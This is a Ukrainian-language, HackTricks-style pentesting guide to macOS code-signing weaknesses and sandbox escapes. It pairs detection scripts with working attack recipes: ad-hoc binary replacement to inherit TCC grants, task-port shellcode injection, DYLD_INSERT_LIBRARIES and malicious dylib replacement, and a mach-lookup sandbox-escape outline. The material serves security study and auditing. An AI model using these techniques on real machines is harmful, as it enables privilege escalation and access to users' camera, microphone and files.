# Слабкі місця Code Signing у macOS і Sandbox Escapes

{{#include ../../../banners/hacktricks-training.md}}

## Бінарні файли з Ad-Hoc підписом

### Основна інформація

**Ad-hoc signing** (`CS_ADHOC`) створює code signature **без ланцюжка сертифікатів** — це хеш коду без перевірки особи розробника. Походження бінарного файлу неможливо пов’язати з певним розробником або організацією.<sup>[[1]](#references)[[4]](#references)</sup>

На Mac з Apple Silicon усі виконувані файли потребують щонайменше Ad-hoc підпису. Це означає, що Ad-hoc підписи можна знайти в багатьох інструментах розробки, пакетах Homebrew і сторонніх утилітах.

### Чому це важливо

- **Відсутність перевірюваної особи** — бінарний файл можна замінити без виявлення перевірками на основі ідентичності
- Сторонні Ad-hoc бінарні файли у **привілейованих позиціях** (FDA, daemon, helpers) є пріоритетними цілями
- У деяких конфігураціях Ad-hoc підписи можуть **перевірятися не так суворо**, як code, підписаний розробником
- Бінарні файли з Ad-hoc підписом, які мають **TCC grants**, є особливо цінними — grants зберігаються навіть після зміни вмісту бінарного файлу (залежить від того, як TCC визначив ключ для grant)

### Виявлення
```bash
# Find ad-hoc signed binaries
find /usr/local /opt /Applications -type f -perm +111 -exec sh -c '
flags=$(codesign -dvv "{}" 2>&1 | grep "CodeDirectory flags")
echo "$flags" | grep -q "adhoc" && echo "AD-HOC: {}"
' \; 2>/dev/null

# Check a specific binary
codesign -dv --verbose=4 /path/to/binary 2>&1 | grep -E "Signature|flags|Authority"
# Ad-hoc shows: "Signature=adhoc" and no Authority lines
```
### Атака: Binary Replacement
```bash
# If an ad-hoc signed daemon binary is in a writable location:
# 1. Check the binary's current capabilities
codesign -d --entitlements - /path/to/target 2>&1

# 2. Note its TCC grants in the database
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT service, auth_value FROM access WHERE client LIKE '%target%';"

# 3. Replace the binary (if location is writable)
cp /tmp/malicious-binary /path/to/target

# 4. Re-sign with ad-hoc signature (mimics the original)
codesign -s - /path/to/target

# 5. On next launch, the daemon runs your code with the original's TCC grants
# (This works when TCC keyed the grant by path rather than code signature)
```
---

## Процеси, доступні для налагодження (get-task-allow)

### Основна інформація

Entitlement **`com.apple.security.get-task-allow`** (або прапорець **`CS_GET_TASK_ALLOW`**) дозволяє **будь-якому процесу під’єднатися як debugger**, читати пам’ять, змінювати регістри, інжектити код і керувати виконанням.<sup>[[3]](#references)</sup>

Це призначено **лише для development builds**. Однак деякі сторонні binary постачаються з цим entitlement у production.

> [!CAUTION]
> Production binary із `get-task-allow` є **миттєвим примітивом експлуатації**. Будь-який локальний процес може викликати `task_for_pid()`, отримати Mach task port цільового процесу та інжектити довільний код, який виконуватиметься з entitlements, дозволами TCC і security context цільового процесу.

### Виявлення
```bash
# Find debuggable binaries
find /Applications /usr/local -type f -perm +111 -exec sh -c '
codesign -d --entitlements - "{}" 2>&1 | grep -q "get-task-allow.*true" && echo "DEBUGGABLE: {}"
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path, privileged FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'get_task_allow_signature'
ORDER BY e.privileged DESC;"
```
### Атака: Task Port Injection
```c
#include <mach/mach.h>
#include <mach/mach_vm.h>

// Get the target's task port (requires get-task-allow on target)
mach_port_t task;
kern_return_t kr = task_for_pid(mach_task_self(), target_pid, &task);

if (kr == KERN_SUCCESS) {
// Allocate memory in target process
mach_vm_address_t addr = 0;
mach_vm_allocate(task, &addr, shellcode_size, VM_FLAGS_ANYWHERE);

// Write shellcode into target
mach_vm_write(task, addr, (vm_offset_t)shellcode, shellcode_size);

// Make it executable
mach_vm_protect(task, addr, shellcode_size, FALSE,
VM_PROT_READ | VM_PROT_EXECUTE);

// Create a remote thread to execute the shellcode
// The shellcode runs with ALL of the target's entitlements and TCC grants
}
```
---

## Відсутність Library Validation + DYLD Environment

### Очищення Library Validation під час виконання

Приватний entitlement **`com.apple.private.security.clear-library-validation`** не вимикає library validation під час запуску процесу. Натомість він дозволяє процесу викликати `csops(..., CS_OPS_CLEAR_LV, ...)` для самого себе під час виконання. Після цього XNU очищує `CS_REQUIRE_LV | CS_FORCED_LV`, за умови що caller має цей entitlement і проходить додаткові перевірки handler. Отже, процес може стати придатною ціллю для library injection лише після того, як досягне code path, що очищує library validation.<sup>[[4]](#references)[[5]](#references)</sup>

### Небезпечна комбінація

Коли binary має **обидва**:<sup>[[3]](#references)</sup>
- `com.apple.security.cs.disable-library-validation` (завантажує будь-який dylib)
- `com.apple.security.cs.allow-dyld-environment-variables` (приймає DYLD env vars)

Це **гарантований примітив code injection** — `DYLD_INSERT_LIBRARIES` працює ідеально.

### Виявлення
```bash
# Find binaries with the deadly combo
find /Applications -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "disable-library-validation.*true" && \
echo "$ents" | grep -q "allow-dyld-environment.*true" && \
echo "INJECTABLE: {}"
' \; 2>/dev/null

# Using the scanner (both flags)
sqlite3 /tmp/executables.db "
SELECT path, privileged, tccPermsStr FROM executables
WHERE noLibVal = 1 AND allowDyldEnv = 1
ORDER BY privileged DESC;"
```
### Атака: DYLD_INSERT_LIBRARIES Injection
```bash
# 1. Create the injection dylib
cat > /tmp/inject.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void injected(void) {
// This runs BEFORE main() in the target's process
// We inherit ALL of the target's:
// - Entitlements
// - TCC grants (camera, mic, FDA, etc.)
// - Sandbox exceptions
// - Mach port rights

FILE *f = fopen("/tmp/injected_proof.txt", "w");
fprintf(f, "Running as PID %d with target's privileges\n", getpid());
fclose(f);

// Example: if target has camera TCC, we can now capture video
// Example: if target has FDA, we can read any file
}
EOF

# 2. Compile the dylib
cc -shared -o /tmp/inject.dylib /tmp/inject.c

# 3. Inject into the target
DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /path/to/noLibVal-dyldEnv-binary

# 4. Verify injection
cat /tmp/injected_proof.txt
```
---

## Тимчасові винятки Sandbox

### Як вони послаблюють Sandbox

Тимчасові винятки Sandbox (`com.apple.security.temporary-exception.*`) створюють проломи в App Sandbox:<sup>[[2]](#references)</sup>

| Виняток | Що він дозволяє |
|---|---|
| `temporary-exception.mach-lookup.global-name` | Підключатися до загальносистемних XPC/Mach-сервісів |
| `temporary-exception.files.absolute-path.read-write` | Читати/записувати файли за межами контейнера app |
| `temporary-exception.iokit-user-client-class` | Відкривати підключення IOKit user-client |
| `temporary-exception.shared-preference.read-only` | Читати налаштування інших app |
| `temporary-exception.files.home-relative-path.read-write` | Отримувати доступ до шляхів відносно `~` |

### Винятки Mach-Lookup = примітив втечі з Sandbox

Найнебезпечнішим винятком є **mach-lookup** — він дозволяє app у sandbox взаємодіяти з привілейованими демонами:
```bash
# Find apps with mach-lookup exceptions
find /Applications -name "*.app" -exec sh -c '
binary="$1/Contents/MacOS/$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)"
[ -f "$binary" ] && {
ents=$(codesign -d --entitlements - "$binary" 2>&1)
echo "$ents" | grep -q "mach-lookup" && {
count=$(echo "$ents" | grep -c "mach-lookup")
echo "[$count exceptions] $(basename "$1")"
}
}
' _ {} \; 2>/dev/null | sort -rn
```
### Attack: Sandbox Escape via Mach-Lookup
```
1. Compromise sandboxed app (renderer exploit, malicious document, etc.)
2. Read entitlements to discover mach-lookup exceptions
3. For each reachable service:
a. Connect via NSXPCConnection
b. Discover the service's protocol (class-dump, strings)
c. Fuzz each exposed method
4. Find a vulnerability in a privileged daemon
5. Exploit → code execution in the daemon's context (outside sandbox)
```
---

## Приватні Apple Entitlements

### Що це таке

Entitlements із префіксом `com.apple.private.*` надають доступ до **внутрішніх API Apple**, які не документовані та недоступні стороннім розробникам. Сторонні бінарні файли з приватними entitlements отримували їх через enterprise-сертифікат, MDM або дистрибуцію не через App Store.

### Небезпечні приватні Entitlements

| Entitlement | Можливість |
|---|---|
| `com.apple.private.tcc.manager` | Повне читання/запис бази даних TCC |
| `com.apple.private.tcc.allow` | Доступ до конкретних сервісів TCC |
| `com.apple.private.security.no-sandbox` | Запуск без sandbox |
| `com.apple.private.iokit` | Прямий доступ до драйверів IOKit |
| `com.apple.private.kernel.\*` | Доступ до інтерфейсів kernel |
| `com.apple.private.xpc.launchd.job-label` | Реєстрація/керування job'ами launchd |
| `com.apple.rootless.install` | Запис до шляхів, захищених SIP |

### Виявлення
```bash
# Find third-party binaries with private entitlements
find /Applications /usr/local -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "com.apple.private" && {
echo "=== {} ==="
echo "$ents" | grep "com.apple.private" | head -10
}
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE privateEnts = 1 AND isAppleBin = 0
ORDER BY privileged DESC;"
```
---

## Кастомні Sandbox-профілі (SBPL)

### Що це таке

Бінарні файли можуть постачатися з **кастомними sandbox-профілями**, написаними мовою SBPL (Seatbelt Profile Language). Ці профілі можуть бути більш обмежувальними АБО **більш дозвільними**, ніж стандартний App Sandbox.

### Аудит кастомних профілів
```bash
# Find custom sandbox profiles
find /Applications /System -name "*.sb" -o -name "*.sbpl" 2>/dev/null

# Dangerous SBPL rules to flag during audit:
# (allow file-write*)         — Write to ANY file
# (allow process-exec*)       — Execute ANY process
# (allow mach-lookup*)        — Connect to ANY Mach service
# (allow network*)            — Full network access
# (allow iokit*)              — Full IOKit access
# (allow file-read*)          — Read ANY file

# Example: Audit a sandbox profile for overly permissive rules
cat /path/to/custom.sb | grep "(allow" | sort -u
```
---

## Шляхи до бібліотек, доступні для запису

### Що це таке

Коли binary завантажує dynamic library зі шляху, до якого поточний користувач має права **запису**, бібліотеку можна замінити на шкідливий code.

### Виявлення
```bash
# Using the scanner — find privileged binaries loading from writable paths
sqlite3 /tmp/executables.db "
SELECT e.path, e.privileged
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'execs_writable_path'
ORDER BY e.privileged DESC
LIMIT 30;"

# Manual check: list library dependencies and check writability
otool -L /path/to/binary | awk '{print $1}' | while read lib; do
[ -f "$lib" ] && [ -w "$lib" ] && echo "WRITABLE: $lib"
done
```
### Атака: Dylib Replacement
```bash
# 1. Find the writable library
otool -L /path/to/target-daemon | grep "/usr/local\|/opt\|Library"

# 2. Back up the original
cp /path/to/writable.dylib /tmp/original.dylib

# 3. Create a replacement that re-exports the original
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
__attribute__((constructor))
void evil(void) {
system("id > /tmp/escalated.txt");
}
EOF
cc -shared -o /tmp/evil.dylib /tmp/evil.c \
-Wl,-reexport_library,/tmp/original.dylib

# 4. Replace the library
cp /tmp/evil.dylib /path/to/writable.dylib

# 5. When the daemon restarts, it loads the evil dylib with daemon privileges
```
## References

- [1] [Apple Developer — Посібник із підписування коду](https://developer.apple.com/library/archive/technotes/tn2206/_index.html)
- [2] [Apple Developer — Пісочниця застосунку](https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html)
- [3] [Apple Developer — Права доступу](https://developer.apple.com/documentation/bundleresources/entitlements)
- [4] [XNU — `bsd/sys/codesign.h` (операції `CS_OPS_*` і `CLEAR_LV_ENTITLEMENT`)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/sys/codesign.h)
- [5] [XNU — `bsd/kern/kern_proc.c` (обробник `csops` / `CS_OPS_CLEAR_LV`)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/kern/kern_proc.c)
{{#include ../../../banners/hacktricks-training.md}}
